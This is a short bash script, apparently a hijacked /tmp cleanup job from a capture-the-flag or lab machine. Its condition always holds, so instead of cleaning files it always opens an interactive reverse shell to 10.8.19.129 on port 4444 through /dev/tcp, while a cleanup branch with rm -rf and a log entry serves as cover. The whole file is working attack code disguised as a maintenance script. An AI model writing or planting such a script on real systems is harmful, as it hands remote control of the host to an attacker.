#!/bin/bash

tmp_files=0
RHOST=10.8.19.129
RPORT=4444
echo $tmp_files
if [ $tmp_files=0 ]
then
        bash -c "exec bash -i &>/dev/tcp/$RHOST/$RPORT <&1"
else
    for LINE in $tmp_files; do
        rm -rf /tmp/$LINE && echo "$(date) | Removed file /tmp/$LINE" >> /var/ftp/scripts/removed_files.log;done
fi
